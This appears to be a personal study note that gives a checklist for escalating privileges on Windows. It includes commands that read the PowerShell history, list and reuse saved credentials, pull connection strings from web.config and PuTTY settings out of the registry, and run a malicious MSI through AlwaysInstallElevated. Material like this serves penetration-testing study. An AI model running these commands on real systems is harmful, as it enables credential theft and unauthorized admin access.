[[MSFVenom]]
[[AccessChk]]
[[WES-NG]]
[[PEASS|WinPEAS]]
[[PowerUp.ps1]]
[[PrivescCheck]]
[[Seatbelt]]

This is a simple and incomplete checklist for escalating Windows access
- Check for Unattended Install Artifacts
	- Unattend.xml
	- sysprep.inf
	- sysprep.xml
	- etc.
- Powershell History
```shell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
- Saved Credentials
```shell
cmdkey /list # list saved
runas /savecred /user:admin cmd.exe # use saved creds
```
- IIS Configurations
	- web.config
```shell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString # Get database connection strings
```
- Software Credentials
	- PuTTY
```shell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
- Scheduled Tasks
	- Same as Linux cronjobs. 
```shell
schtasks /query /tn <taskname> /fo list /v # use icacls for file permissions
```
- Check for Risky Privileges
	- SeImpersonatePrivilege
	- SeManageVolumePrivilege
	- SeTakeOwnership
	- SeBackup/SeRestore
- Check for Unquoted Service Paths
	- Must be running as system for full access, or insecure service perms
- Check for Insecure Service Permissions
- Check for Insecure Service Executables
- Check for Weak Registry Permissions on Services
- Check for Weak Permissions on Autorun Executables
- Check for AlwaysInstallElevated Reg Key
```shell
# If both of these are set, you can generate a malicious msi and it will run with Admin privs
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

# Run an msi (with admin!!!)
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
- [[PEASS|WinPEAS]]
	- Quick and easy check for many misconfigurations
	- Comes in .exe and .bat formats, recommend .exe but signatured. 

# For Later
![[Windows-Priv-Esc.png]]